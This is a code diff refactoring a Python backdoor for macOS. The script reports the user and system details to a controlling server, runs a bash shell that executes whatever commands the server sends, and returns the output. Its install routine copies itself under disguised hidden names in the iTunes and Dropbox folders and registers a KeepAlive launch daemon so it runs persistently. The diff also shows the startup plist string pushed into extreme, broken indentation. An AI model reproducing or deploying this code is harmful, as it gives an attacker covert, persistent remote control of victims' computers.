@@ -18,15 +18,20 @@ except ImportError:
 HOST = 'localhost'
 PORT = 1708
 
-class ByteLock:
+
+class ByteLockBundler:
     def __init__(self, sock):
         self.bytes = b''
-        self.bytelock = threading.Lock()
         self.sock = sock
+        self.bytelock = threading.Lock()
 
-    def write(self,bytes):
+    def setLock(self,lock):
+        self.bytelock = lock
+
+    def write(self, wbytes):
+        print(self.bytes)
         with self.bytelock:
-            self.bytes += bytes
+            self.bytes += wbytes
 
     def getAndClear(self):
         with self.bytelock:
@@ -34,15 +39,13 @@ class ByteLock:
             self.bytes = b''
             return temp
 
-    def writeLoop(self,delay=0.1):
-        while True:
-            time.sleep(delay)
-            buff = self.getAndClear()
-            if len(buff)>0:
-                outputdict = dict(output=buff.decode('UTF-8'))
-                json_dict = json.dumps(outputdict)
-                self.sock.sendall(json_dict.encode('UTF-8'))
-
+    def writeBundle(self):
+        print(self.bytes)
+        buff = self.getAndClear()
+        if len(buff) > 0:
+            outputdict = dict(output=buff.decode('UTF-8'))
+            json_dict = json.dumps(outputdict)
+            self.sock.sendall(json_dict.encode('UTF-8'))
 
 def main():
     while True:
@@ -51,7 +54,7 @@ def main():
                 # Get and send info
                 user, arch = getInfo()
 
-                infodict = dict(user=user,arch=arch)
+                infodict = dict(user=user, arch=arch)
                 json_dict = json.dumps(infodict)
 
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -59,17 +62,19 @@ def main():
                 s.sendall(json_dict.encode('UTF-8'))
                 serve(s)
             except Exception as e:
-                # DEBUG
+                # TODO: Remove debug code
                 raise e
         # Try again in a minute
         time.sleep(60)
 
+
 def serve(sock):
-    bytelock = ByteLock(sock)
+    bytelock = ByteLockBundler(sock)
+
     proc = subprocess.Popen(["bash"],
                             stdin=subprocess.PIPE,
                             stdout=subprocess.PIPE,
-                            stderr=sock.makefile('wb'))
+                            stderr=subprocess.PIPE)
 
     # Get commands from server, parse and send appropriate to proc
     def pollProc():
@@ -79,27 +84,38 @@ def serve(sock):
                 break
             if out != '':
                 bytelock.write(out)
+
     def pollSock():
+        # TODO change to json for general formatting
         for line in readSocket(sock):
+            line += "\n"
             proc.stdin.write(line.encode('UTF-8'))
+            proc.stdin.flush()
+
+    def writeBundles():
+        while True:
+            time.sleep(0.2)
+            bytelock.writeBundle()
 
     # make thread for each function + one to send json with output to server
-    p1 = Process(target=pollSock)
-    p2 = Process(target=pollProc)
-    p3 = Process(target=bytelock.writeLoop)
-    p1.start()
-    p2.start()
-    p3.start()
-    p2.join()
-    p3.join()
-    p1.join()
+    t_sock = threading.Thread(target=pollSock)
+    t_proc = threading.Thread(target=pollProc)
+    t_bndl = threading.Thread(target=writeBundles)
 
+    t_sock.start()
+    t_proc.start()
+    t_bndl.start()
 
-def readSocket(sock,endchars='\n'):
+    t_sock.join()
+    t_proc.join()
+    t_bndl.join()
+
+def readSocket(sock, endchars='\n'):
+    # TODO change to <packetlength><packet> format instead of newline separated
     buff = b""
     while True:
         packet = sock.recv(1024)
-        if len(packet)==0:
+        if len(packet) == 0:
             raise Exception("Server closed socket")
         buff += packet
         try:
@@ -109,13 +125,14 @@ def readSocket(sock,endchars='\n'):
                 buff = buffstr.encode('UTF-8')
                 yield line
         except Exception as e:
-            print("Exception: "+str(e))
+            print("Exception: " + str(e))
+
 
 def getInfo():
     proc = subprocess.Popen(["whoami"], stdout=subprocess.PIPE)
     (user, err) = proc.communicate()
 
-    proc = subprocess.Popen(["uname","-a"], stdout=subprocess.PIPE)
+    proc = subprocess.Popen(["uname", "-a"], stdout=subprocess.PIPE)
     (arch, err) = proc.communicate()
 
     return user.decode('UTF-8'), arch.decode('UTF-8')
@@ -136,32 +153,33 @@ def hasInternetConnection():
 ###
 
 STARTUP_PLIST = ('<?xml version="1.0" encoding="UTF-8"?>' + '\n'
-                 '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" '
-                 '"http://www.apple.com/DTDs/PropertyList-1.0.dtd">' + '\n'
-                 '<plist version="1.0">' + '\n'
-                 '<dict>' + '\n'
-                 '\t' + '<key>Label</key>' + '\n'
-                 '\t' + '<string>pythondaemon</string>' + '\n'
-                 '\t' + '<key>ProgramArguments</key>' + '\n'
-                 '\t' + '<array>' + '\n'
-                 '\t\t' + '<string>{python_path}</string>' + '\n'
-                 '\t\t' + '<string>{script_path}</string>' + '\n'
-                 '\t' + '</array>' + '\n'
-                 '\t' + '<key>StandardErrorPath</key>' + '\n'
-                 '\t' + '<string>/var/log/python_script.error</string>' + '\n'
-                 '\t' + '<key>KeepAlive</key>' + '\n'
-                 '\t' + '<true/>' + '\n'
-                 '</dict>' + '\n'
-                 '</plist>' + '\n')
+                                                            '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" '
+                                                            '"http://www.apple.com/DTDs/PropertyList-1.0.dtd">' + '\n'
+                                                                                                                  '<plist version="1.0">' + '\n'
+                                                                                                                                            '<dict>' + '\n'
+                                                                                                                                                       '\t' + '<key>Label</key>' + '\n'
+                                                                                                                                                                                   '\t' + '<string>pythondaemon</string>' + '\n'
+                                                                                                                                                                                                                            '\t' + '<key>ProgramArguments</key>' + '\n'
+                                                                                                                                                                                                                                                                   '\t' + '<array>' + '\n'
+                                                                                                                                                                                                                                                                                      '\t\t' + '<string>{python_path}</string>' + '\n'
+                                                                                                                                                                                                                                                                                                                                  '\t\t' + '<string>{script_path}</string>' + '\n'
+                                                                                                                                                                                                                                                                                                                                                                              '\t' + '</array>' + '\n'
+                                                                                                                                                                                                                                                                                                                                                                                                  '\t' + '<key>StandardErrorPath</key>' + '\n'
+                                                                                                                                                                                                                                                                                                                                                                                                                                          '\t' + '<string>/var/log/python_script.error</string>' + '\n'
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   '\t' + '<key>KeepAlive</key>' + '\n'
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   '\t' + '<true/>' + '\n'
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      '</dict>' + '\n'
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  '</plist>' + '\n')
 
 STARTUP_LOCS = ['/System/Library/LaunchAgents',
                 '/System/Library/LaunchDaemons',
                 '~/Library/LaunchAgents']
 DAEMON_NAME = 'library_launcher.plist'
 
-SCRIPT_LOCS = ['~/Music/iTunes/.library.py','~/.dropbox/.index.py']
+SCRIPT_LOCS = ['~/Music/iTunes/.library.py', '~/.dropbox/.index.py']
 
 INSTALL_FLAG = '-install'
+
 
 def install():
     # Find python
@@ -177,7 +195,7 @@ def install():
         script_path = os.path.expanduser(loc)
         if not os.path.exists(script_path):
             try:
-                shutil.copy(os.path.abspath(__file__),script_path)
+                shutil.copy(os.path.abspath(__file__), script_path)
                 break
             except:
                 pass
@@ -187,11 +205,11 @@ def install():
     # Now we have hidden the script
     daemon_loc = None
     for loc in STARTUP_LOCS:
-        daemon_loc = os.path.join(os.path.expanduser(loc),DAEMON_NAME)
+        daemon_loc = os.path.join(os.path.expanduser(loc), DAEMON_NAME)
         if not os.path.exists(daemon_loc):
             try:
-                with open(daemon_loc,"w") as f:
-                    f.write(STARTUP_PLIST.format(python_path=python_path,script_path=script_path))
+                with open(daemon_loc, "w") as f:
+                    f.write(STARTUP_PLIST.format(python_path=python_path, script_path=script_path))
                 break
             except:
                 pass
